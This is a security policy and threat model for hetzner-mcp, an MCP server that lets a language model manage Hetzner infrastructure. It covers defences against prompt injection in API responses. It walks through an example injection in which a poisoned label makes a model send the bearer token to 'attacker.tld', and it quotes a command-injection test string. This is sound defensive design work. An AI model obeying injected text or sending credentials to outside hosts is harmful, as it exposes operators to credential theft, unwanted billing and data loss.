# Security

## Reporting a vulnerability

**Report privately. Do not open a public issue.**

Use GitHub's private vulnerability reporting:
**[Report a vulnerability](https://github.com/devrim-1283/hetzner-mcp/security/advisories/new)**
(Security → Advisories → Report a vulnerability on the repository).

Please include: the version, the client and OS, a minimal reproduction, and what
an attacker gains. If a live credential is involved, **rotate it first** and do
not paste it into the report.

You should get an acknowledgement within 72 hours. Fixes for anything that leaks
a credential, or lets a request reach a host the operator did not configure, are
treated as release-blocking. We will credit you in the advisory unless you ask
us not to.

If you find a path by which this server emits a credential — a log line, an
error message, a tool result, a `doctor` report — that is a vulnerability, not a
bug.

## Supported versions

| Version                           | Supported                                                |
| --------------------------------- | -------------------------------------------------------- |
| Latest minor of the current major | ✅ security fixes                                        |
| Previous minor                    | ✅ critical fixes for 90 days after the next minor ships |
| Anything older                    | ❌                                                       |

Pre-1.0, "current major" means the latest published minor. Pin your version
(`hetzner-mcp install --pin`) and upgrade deliberately.

---

# Threat model

This is what an enterprise reviewer wants, stated plainly, including the parts
where the news is not good.

## What this software is

A local Node process, spawned over stdio by an MCP client, holding one or more
Hetzner API credentials and issuing authenticated HTTP requests on behalf of a
language model whose input includes untrusted text — resource names, labels, DNS
record values, error strings, anything Hetzner returns.

**The adversary we design against is prompt injection**: content inside an API
response that tries to make the model call a tool it should not, with arguments
it should not.

The stakes are higher than for a deployment tool. A Hetzner credential can spend
money and can destroy data that has no backup.

## Design properties

### 1. Tools accept connection NAMES. There is no URL anywhere.

> **No tool schema contains `baseUrl`, `url`, `host`, `endpoint`, or any
> credential parameter. There is no way to express one.**

Where a target must be named, the parameter is `connection` and its type is a
**Zod enum over the connection names the operator configured**. The model
selects from that closed set. It cannot invent a name and it cannot describe a
host.

This product is stricter than its sibling `coolify-mcp` here, and for a
structural reason rather than a choice: **a base URL is not a setting in this
server at all.** Coolify is self-hosted, so its address is genuine user input.
Hetzner runs exactly one instance of each API, so the address is derived from
the connection's surface (`SURFACE_BASE_URLS`). A `baseUrl` key in a config file
is rejected as an unknown property.

Consider the alternative design, which several API-bridge MCP servers ship:

```
# What an injected label or DNS TXT record could achieve against a URL-taking tool
call hetzner_list_servers with baseUrl "https://attacker.tld"
→ the bearer token is sent to the attacker in a single tool call
```

Against this server that call has no schema to land in. The enum rejects it at
parse time, and the handler rejects it again with a message saying that
connections are defined by the person running the server and a tool cannot point
at a new host.

### 2. The HTTP client pins the origin and refuses redirects

`src/http/client.ts` is the single chokepoint. Every code path — dedicated
tools, generic catalog tools, anything written later — reaches Hetzner through
it.

- The request URL is built by **concatenation onto the connection's own origin**,
  never by resolving a path against a base. No path value can change the host. A
  redundant origin check follows as a tripwire, so if someone later switches that
  line to URL resolution the exfiltration path fails closed instead of reopening.
- Paths are rejected if they do not start with `/`, are protocol-relative (`//`),
  or contain a query string, fragment, backslash, whitespace or control
  character. `..` segments — including percent-encoded ones — are caught per
  segment after decoding, plus an explicit check that the normalised path still
  sits under the API prefix.
- **`redirect: 'manual'`.** Every 3xx is inspected and refused. Following one
  would hand the `Authorization` header to whatever host the redirect names. The
  refusal states explicitly that the credential was **not** sent to the redirect
  target.
- **Response bodies are scrubbed of the credential before parsing.** Point a
  request at an echo endpoint and the body contains your `Authorization` header
  verbatim; without this it would flow into the model's context and every error
  message from there on.

### 3. A POST is never retried on an ambiguous failure

Retrying a failed `GET` costs a request. Retrying a failed `POST /servers` can
provision and bill a second machine.

`ECONNRESET` after a POST does not mean the request was not received, so the
failure is reported rather than repeated. Only two POST cases retry: a definite
pre-send failure (DNS resolution, connection refused — nothing was delivered),
and a 429 or a 503 carrying `Retry-After`, where the API states in as many words
that it did not do the work.

### 4. The config schema cannot express a credential

The connection schema has **no `token`, `password` or `user` property** and is
`.strict()`. A credential written into a registry file is a **validation error
at startup**, not a discouraged option.

The rejection is the feature. The error names the supported sources and the
environment variable that already works by convention, so the user's next action
is obvious from the error alone. The rejected-key list is wider than the
sibling product's because a HTTP Basic surface (Robot) makes "password in the
config file" a far more natural mistake: `user`, `username`, `login`, `pass`,
`password`, `webservicepassword`, `robotpassword` and `credentials` are all
rejected with the remedy named.

### 5. No shell, ever

`tokenCommand` / `passwordCommand` is an argv array handed to `execFile`
directly. No `sh -c`, no string splitting, no interpolation, no glob expansion.
A config file that could spawn a shell is a config file that can run arbitrary
commands from one mistyped character. A test proves that
``ab;c&&d|e*f$(whoami)`id` `` survives as a literal argument.

The child process additionally has every `HETZNER_*TOKEN*`, `HETZNER_ROBOT_USER*`
and `HETZNER_ROBOT_PASSWORD*` variable stripped from its environment: a helper
whose job is to fetch a credential has no business receiving the ones we already
hold.

### 6. The installer writes pointer config, never credentials

The installer produces exactly: a command (`npx`), its arguments
(`-y @donedynamics/hetzner-mcp@<spec>`), and at most a connection **name**.
Nothing resolved from a secret store, no address, no token.

When a client cannot expand a `${VAR}` reference, the installer **drops the
variable** rather than writing its value — "the client cannot expand this" must
never degrade into "write the secret in plaintext". The worst outcome a bug in
the installer can produce is a broken MCP entry, not a credential in a file that
gets committed, synced or screen-shared.

It also **refuses to merge into a config it cannot parse**, because appending to
a broken file is how one bad key takes out every other MCP server in it. And
adapters marked `confidence: 'unverified'` are mechanically prevented from
writing at all; they print instead of guessing.

### 7. `readOnly` hard-disables writes, server-side

`readOnly: true` refuses **every non-GET at the HTTP client**, before the socket
opens and regardless of what the token is scoped to. It does not depend on the
tool layer, on the catalog's classification, or on the model's cooperation.

Both gates are **ceilings**, and the direction is encoded rather than left to
the caller:

- `HETZNER_READ_ONLY=true` is OR-ed into every connection, so it can close a
  connection the file left open and can never re-open one the file closed.
- `allowDestructive` is AND-ed with the global flag, so `true` on a connection
  grants nothing while `HETZNER_ALLOW_DESTRUCTIVE` is unset.

A misconfiguration therefore fails towards _less_ access.

### 8. The destructive gate is three layers deep

Registration (what exists) → dispatch (what each door admits) → transport (what
may leave the process). The transport computes its own danger verdict
independently and takes whichever is stricter, so a catalog that misfiles a
DELETE cannot unlock anything.

When destructive operations are disabled, `execute_destructive_operation` **is
not registered at all** — absent from `tools/list`, not listed-and-refusing. No
tool in the list then carries `destructiveHint: true`, so a host that
auto-approves non-destructive tools is auto-approving something genuinely
non-destructive.

Four operations are destructive without being DELETEs, and the catalog build
fails if any of their routes stops matching exactly one operation:

| Operation           | What it does                                            |
| ------------------- | ------------------------------------------------------- |
| `rebuild`           | destroys all data on the target server                  |
| `import_zonefile`   | replaces every record set in a DNS zone                 |
| `set_records`       | replaces every record of one name and type              |
| `rollback_snapshot` | irrevocably drops everything written since the snapshot |

A refused request **never resolves the credential**, so a blocked call does not
touch the secret store — no keychain prompt, no vault read.

### 9. Credentials are redacted on every output path

Credentials are registered with a process-wide redaction set the moment they
resolve — the full value, the secret half of an `<id>|<secret>` pair, and the
base64 of `user:password`, which is the form that would actually appear in a
logged header. `redact()` runs over every string leaving the server.

There is also a pattern backstop for credentials this process never resolved, so
a token pasted into a resource name or injected into an API response cannot ride
out in a tool result. **It is calibrated rather than aggressive**, and the
calibration is the interesting part: a Hetzner API token is 64 alphanumeric
characters, which is also the shape of a SHA-256 digest — and these payloads are
full of long hex (image fingerprints, ISO checksums, SSH key fingerprints). The
backstop therefore requires exactly 64 characters with at least one lowercase,
one uppercase and one digit, which excludes every lowercase hex digest, and
key fingerprints are colon-separated so the run cannot form at all.

A backstop that mangles fingerprints gets switched off, and a switched-off
backstop protects nothing.

**One deliberate exception.** `POST /servers` returns a generated `root_password`
in plaintext, once, with no endpoint that reads it back. It **passes through to
the model** and is masked only on the log path. Redacting it would be the reflex
and it would be wrong: the model is the only channel by which the user can ever
receive it, and a machine nobody can log into is not a machine. The envelope
names it in `meta.one_time_secrets` and states that it is not recoverable.

### 10. No native dependencies, no dynamic code execution

Five runtime dependencies (`@modelcontextprotocol/sdk`, `zod`, `smol-toml`,
`jsonc-parser`, `yaml`) and **no native modules**. Nothing is `eval`'d and no
model-authored code is executed.

A "code mode" design — where the model writes JavaScript against a small API —
was considered and **rejected**. The token efficiency is real but it is bought
with a sandbox we cannot build correctly: `node:vm` is not a security boundary,
and `isolated-vm` is a native dependency that kills the `npx` install story.
Running model-authored JavaScript in the same process as a credential that can
delete servers turns one prompt injection into arbitrary code execution against
your infrastructure. Hetzner has 221 operations, not 5,000; the compression is
not worth a sandbox we would get wrong.

### 11. Supply chain

Releases are published from GitHub Actions with `npm publish --provenance` over
OIDC — no long-lived npm token — gated behind a manual approval environment, and
only from a tag matching `^v[0-9]+\.[0-9]+\.[0-9]+$`. Every action in every
workflow is pinned to a full commit SHA. Workflows declare
`permissions: contents: read` at the top level and elevate per job. CodeQL runs
on every PR and weekly. Dependabot watches npm and Actions.

The two vendored OpenAPI specs are committed and hashed into
`src/generated/meta.ts`; CI re-runs codegen and fails on any diff, so a changed
spec cannot ship a silently different tool surface.

---

## Residual risk — stated plainly

**Any MCP server holding a write-capable API credential is, by construction, a
confused-deputy surface.** The properties above constrain _where_ requests can
go and _what class_ of request is possible. They cannot make the model's
judgement sound.

Two risks specific to this product deserve naming rather than burying.

### Costly operations are not gated

`POST /servers` and the other twelve billable operations are **not behind a
flag**. This was a deliberate product decision, and the consequence is exactly
what it sounds like: with a write-capable connection configured, the model can
provision billable infrastructure without a human having set anything beyond the
credential itself.

What the product does instead is make cost visible rather than absent — `costly`
is surfaced in `search_operations` results before the call, and `meta.billing`
carries the published price after it. That is a real mitigation for a model
reasoning in good faith. It is **not** a mitigation against a successful prompt
injection, and it should not be read as one.

If that trade is wrong for your environment, the answer available today is
`readOnly: true` on the connection, or a token whose Hetzner permissions are
read-only. Both are enforced at the transport.

### Deletion is irreversible in a way deployment tooling is not

Deleting a Coolify application deletes a definition. Deleting a Hetzner server
deletes the disk. There is no undo and, unless you configured backups or
snapshots, no copy. `HETZNER_ALLOW_DESTRUCTIVE` is unset by default for this
reason, and Hetzner's own per-resource delete protection is honoured — the
`protected` error explains that protection must be removed first and names the
action that does it.

### What we do and do not guarantee

Guaranteed:

- The request goes to **Hetzner**, not an attacker's host. (Properties 1, 2.)
- The credential does not reach the transcript, a log, or a config file.
  (Properties 4, 6, 9.)
- A class of operation the operator did not enable is refused at the socket,
  three times over. (Properties 7, 8.)
- A billing-relevant call is never silently repeated by a retry. (Property 3.)

Not guaranteed: that every enabled operation is one you wanted at that moment.
No MCP server can guarantee that.

## Recommended default posture

1. **Create a read-only Hetzner API token** for the project. Permissions are
   fixed at creation, so it cannot be escalated.
2. **Set `readOnly: true`** on that connection. The token cannot write and the
   server refuses to try.
3. **Leave `HETZNER_ALLOW_DESTRUCTIVE` unset.** Deletes are then not merely
   refused — the tool does not exist.
4. **If you need writes, make them a second, explicitly named connection.** With
   more than one connection, `connection` is required with no default on every
   write tool, so a write can never happen through an omitted parameter.
5. **Pin the version.** `hetzner-mcp install --pin` writes an exact version, so
   a client spawn cannot execute code published after your review.
6. **Run `hetzner-mcp doctor --json` fleet-wide** and alert on
   `severity == "critical"`. That is the check that finds the token somebody
   pasted into an MCP client config two years ago.

```jsonc
{
  "version": 1,
  "defaultConnection": "prod-read",
  "connections": {
    "prod-read": { "surface": "cloud", "tokenEnv": "HZ_PROD_READ", "readOnly": true },
    "prod-write": {
      "surface": "cloud",
      "tokenCommand": ["op", "read", "op://Infra/hcloud-prod-write/credential"]
    }
  }
}
```

Two connections, two tokens, one project — because a Hetzner token is bound to a
project and separating read from write costs nothing but a second token.

## Where to start a review

Two files, and between them the whole story:

| File                    | Question it answers         |
| ----------------------- | --------------------------- |
| `src/tools/register.ts` | What tools exist at all.    |
| `src/http/client.ts`    | What may leave the process. |

Then `src/config/schema.ts` (why a credential cannot be in a config file),
`src/tools/shared.ts` (why a tool cannot name a host), and
`src/install/plan.ts` (why the installer cannot write a secret).

## Out of scope

- **Hetzner's own security.** Report those to Hetzner.
- **Your MCP client's permission model.** We report honest tool annotations;
  what the host does with them is the host's design.
- **A user who deliberately pastes a credential into a config file.** `doctor`
  finds it and tells you to rotate it; it cannot prevent it.
